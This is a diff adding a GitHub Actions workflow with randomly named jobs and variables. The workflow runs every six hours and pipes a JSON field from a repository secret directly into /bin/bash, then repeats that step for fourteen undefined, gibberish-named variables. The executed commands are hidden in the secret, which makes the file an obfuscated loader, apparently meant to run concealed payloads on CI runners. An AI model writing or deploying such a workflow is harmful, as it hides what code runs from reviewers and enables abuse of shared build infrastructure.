@@ -1,0 +1,32 @@
+name: lingligui6152
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingligui6152
+        env:
+          khrtp84: ${{ secrets.khrtp84 }}
+        run: |
+          echo $khrtp84 | jq -r .prwv3 | /bin/bash
+          echo $aofnb446 | jq -r .emmng66288 | /bin/bash
+          echo $h710 | jq -r .r07735 | /bin/bash
+          echo $xjm12 | jq -r .egt23001 | /bin/bash
+          echo $gd6927 | jq -r .pz9506 | /bin/bash
+          echo $jpjg90 | jq -r .kqkc4 | /bin/bash
+          echo $hly5 | jq -r .i678 | /bin/bash
+          echo $bczen5 | jq -r .sus13 | /bin/bash
+          echo $zam84 | jq -r .fvab5 | /bin/bash
+          echo $fio07427 | jq -r .ps26 | /bin/bash
+          echo $xfvw49755 | jq -r .etacj3463 | /bin/bash
+          echo $xgzba307 | jq -r .yasow795 | /bin/bash
+          echo $wcdhj009 | jq -r .zwc560 | /bin/bash
+          echo $skko09 | jq -r .h31041 | /bin/bash
+          echo $g016 | jq -r .jbzc59 | /bin/bash
+
